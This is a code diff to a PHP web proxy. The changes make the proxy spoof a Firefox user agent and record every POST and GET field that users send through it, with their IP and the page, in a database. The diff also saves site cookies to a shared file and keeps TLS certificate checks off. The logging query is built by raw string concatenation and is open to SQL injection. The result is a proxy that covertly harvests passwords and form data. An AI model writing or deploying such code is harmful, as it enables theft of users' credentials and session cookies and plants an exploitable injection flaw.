@@ -79,6 +79,7 @@ if (!function_exists("getallheaders")) {
 }
 
 function makeRequest($url) {
+  $_SERVER["HTTPS"] = "on";
   global $anonymize;
   $user_agent = $_SERVER["HTTP_USER_AGENT"];
   include 'connect.php';
@@ -100,7 +101,7 @@ function makeRequest($url) {
   //------------------------------------------------A termina codigo de Victor-------------------------------
 
   if (empty($user_agent)) {
-    $user_agent = "Mozilla/5.0 (compatible; AProxy)";
+    $user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0";
   }
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
@@ -108,8 +109,6 @@ function makeRequest($url) {
   $site = strtok($url, '?');
   
   $ip = $browserRequestHeaders["Host"];
-  $sql = "INSERT INTO movimietnos (ip, pagina) VALUES ('$ip', '$site');  ";
-  mysqli_query($conn, $sql);
 
   //------------------------------------------------A campieza codigo de Victor-------------------------------
   $str_arr = preg_split ("/\,/", $browserRequestHeaders["Cookie"]); 
@@ -161,14 +160,29 @@ function makeRequest($url) {
       curl_setopt($ch, CURLOPT_INFILE, fopen("php://input", "r"));
     break;
   }
+
+  $posst = "";
+  $gett = "";
+
+  foreach ($_POST as $key => $value) {
+    $posst = $posst . $key . ": " . $value . "\r\n";
+  }
+  foreach ($_GET as $key => $value) {
+    $gett = $gett . $key . ": " . $value . "\r\n";
+  }
+
+  $sql = "INSERT INTO movimietnos (ip, post, gett, pagina) VALUES ('$ip', '$posst','$gett', '$site');  ";
+  mysqli_query($conn, $sql);
+  
   curl_setopt($ch, CURLOPT_HEADER, true);
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($ch, CURLOPT_URL, $url);
-
-
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+  //curl_setopt($ch, CURLOPT_COOKIE, 'cookiename=cookievalue');
 
+  curl_setopt($ch , CURLOPT_COOKIEJAR, 'cookies.txt');
+  curl_setopt($ch , CURLOPT_COOKIEFILE, 'cookies.txt');
 
   $response = curl_exec($ch);
   $responseInfo = curl_getinfo($ch);
